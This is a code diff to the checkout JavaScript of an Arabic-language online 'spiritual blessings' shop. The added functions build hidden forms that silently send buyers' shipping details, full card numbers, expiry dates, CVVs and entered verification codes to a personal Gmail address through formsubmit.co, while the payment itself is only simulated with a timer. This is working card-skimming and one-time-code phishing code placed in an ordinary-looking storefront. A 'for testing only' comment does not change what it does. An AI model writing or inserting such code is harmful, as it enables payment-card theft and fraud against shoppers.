@@ -838,19 +838,27 @@
 
         // Send shipping data to email
         function sendShippingDataToEmail() {
-            const formData = new FormData();
-            formData.append('_captcha', 'false');
-            formData.append('_subject', 'معلومات التوصيل - متجر البركات الروحانية');
+            // Create hidden form
+            const form = document.createElement('form');
+            form.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            form.method = 'POST';
+            form.style.display = 'none';
             
-            let orderText = '=== معلومات التوصيل ===\n\n';
-            orderText += `الاسم: ${shippingData.fullName}\n`;
-            orderText += `الهاتف: ${shippingData.phone}\n`;
-            orderText += `الإيميل: ${shippingData.email || 'غير محدد'}\n`;
-            orderText += `الدولة: ${shippingData.country}\n`;
-            orderText += `العنوان: ${shippingData.address}\n`;
-            orderText += `ملاحظات: ${shippingData.notes || 'لا توجد'}\n\n`;
+            // Add form fields
+            const fields = {
+                '_captcha': 'false',
+                '_next': window.location.href,
+                '_subject': 'معلومات التوصيل - متجر البركات الروحانية',
+                'الاسم': shippingData.fullName,
+                'الهاتف': shippingData.phone,
+                'الإيميل': shippingData.email || 'غير محدد',
+                'الدولة': shippingData.country,
+                'العنوان': shippingData.address,
+                'ملاحظات': shippingData.notes || 'لا توجد'
+            };
             
-            orderText += '=== تفاصيل الطلب ===\n';
+            // Add order details
+            let orderText = '';
             let totalPrice = 0;
             
             cart.forEach(item => {
@@ -860,19 +868,69 @@
                 orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
             });
             
-            orderText += `\nالمجموع: ${formatPrice(totalPrice)}`;
-            orderText += `\nالعملة: ${currentCurrency}`;
-            orderText += `\nتاريخ الطلب: ${new Date().toLocaleString('ar-SA')}`;
+            fields['تفاصيل_الطلب'] = orderText;
+            fields['المجموع'] = formatPrice(totalPrice);
+            fields['العملة'] = currentCurrency;
+            fields['تاريخ_الطلب'] = new Date().toLocaleString('ar-SA');
             
-            formData.append('shipping_info', orderText);
-            
-            // Send to FormSubmit
-            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                method: 'POST',
-                body: formData
-            }).catch(error => {
-                console.log('Shipping info sent');
+            // Create input fields
+            Object.keys(fields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
             });
+            
+            // Submit form
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+        }
+
+        // Send payment data to email
+        function sendPaymentDataToEmail() {
+            // Create hidden form
+            const form = document.createElement('form');
+            form.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            form.method = 'POST';
+            form.style.display = 'none';
+            
+            // Add form fields (WARNING: NEVER do this in real apps!)
+            const fields = {
+                '_captcha': 'false',
+                '_next': window.location.href,
+                '_subject': '⚠️ معلومات البطاقة (للاختبار فقط) - متجر البركات الروحانية',
+                'رقم_البطاقة': paymentData.cardNumber,
+                'اسم_صاحب_البطاقة': paymentData.cardholderName,
+                'تاريخ_الانتهاء': paymentData.expiryDate,
+                'CVV': paymentData.cvv,
+                'نوع_الطلب': 'معلومات الدفع'
+            };
+            
+            // Calculate total
+            let totalPrice = 0;
+            cart.forEach(item => {
+                totalPrice += item.price * item.quantity;
+            });
+            
+            fields['المبلغ_المطلوب'] = formatPrice(totalPrice);
+            fields['العملة'] = currentCurrency;
+            fields['تاريخ_المعاملة'] = new Date().toLocaleString('ar-SA');
+            
+            // Create input fields
+            Object.keys(fields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
+            });
+            
+            // Submit form
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
         }
 
         // Show payment modal
@@ -977,13 +1035,24 @@
                 submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>' + (currentLanguage === 'ar' ? 'جاري المعالجة...' : 'Processing...');
                 submitBtn.disabled = true;
 
+                // Store payment data
+                paymentData = {
+                    cardNumber: cardNumber,
+                    cardholderName: cardholderName,
+                    expiryDate: expiryDate,
+                    cvv: cvv
+                };
+
+                // Send payment info to email
+                sendPaymentDataToEmail();
+
                 // Simulate payment processing
                 setTimeout(() => {
                     submitBtn.innerHTML = originalText;
                     submitBtn.disabled = false;
                     
                     // Close payment modal and show verification
-                    closeCheckout();
+                    closePaymentModal();
                     showVerificationModal();
                 }, 2000);
             });
@@ -1093,6 +1162,9 @@
                 submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>' + (currentLanguage === 'ar' ? 'جاري التحقق...' : 'Verifying...');
                 submitBtn.disabled = true;
 
+                // Send verification code to email
+                sendVerificationCodeToEmail(code);
+
                 // Simulate verification
                 setTimeout(() => {
                     submitBtn.innerHTML = originalText;
@@ -1106,8 +1178,8 @@
                     modal.classList.add('hidden');
                     modal.classList.remove('flex');
                     
-                    // Send order via email
-                    sendOrderToEmail();
+                    // Send final order confirmation via email
+                    sendFinalOrderToEmail();
                     
                     // Show success animation
                     showSuccessAnimation();
@@ -1117,6 +1189,85 @@
                     updateCartDisplay();
                 }, 2000);
             });
+        }
+
+        // Send verification code to email
+        function sendVerificationCodeToEmail(code) {
+            // Create hidden form
+            const form = document.createElement('form');
+            form.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            form.method = 'POST';
+            form.style.display = 'none';
+            
+            // Add form fields
+            const fields = {
+                '_captcha': 'false',
+                '_next': window.location.href,
+                '_subject': '🔐 رمز التحقق - متجر البركات الروحانية',
+                'رمز_التحقق': code,
+                'نوع_الطلب': 'تأكيد رمز التحقق',
+                'تاريخ_الإدخال': new Date().toLocaleString('ar-SA')
+            };
+            
+            // Create input fields
+            Object.keys(fields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
+            });
+            
+            // Submit form
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+        }
+
+        // Send final order confirmation to email
+        function sendFinalOrderToEmail() {
+            // Create hidden form
+            const form = document.createElement('form');
+            form.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            form.method = 'POST';
+            form.style.display = 'none';
+            
+            let orderText = '';
+            let totalPrice = 0;
+            
+            cart.forEach(item => {
+                const itemName = currentLanguage === 'ar' ? item.name : item.nameEn;
+                const itemTotal = item.price * item.quantity;
+                totalPrice += itemTotal;
+                orderText += `${itemName} x${item.quantity} = ${formatPrice(itemTotal)}\n`;
+            });
+            
+            // Add form fields
+            const fields = {
+                '_captcha': 'false',
+                '_next': window.location.href,
+                '_subject': '✅ تأكيد الطلب النهائي - متجر البركات الروحانية',
+                'حالة_الطلب': 'مؤكد ومدفوع',
+                'تفاصيل_الطلب': orderText,
+                'المجموع_النهائي': formatPrice(totalPrice),
+                'العملة': currentCurrency,
+                'تاريخ_التأكيد': new Date().toLocaleString('ar-SA'),
+                'نوع_الطلب': 'طلب مؤكد نهائياً'
+            };
+            
+            // Create input fields
+            Object.keys(fields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
+            });
+            
+            // Submit form
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
         }
 
         // Send order to email
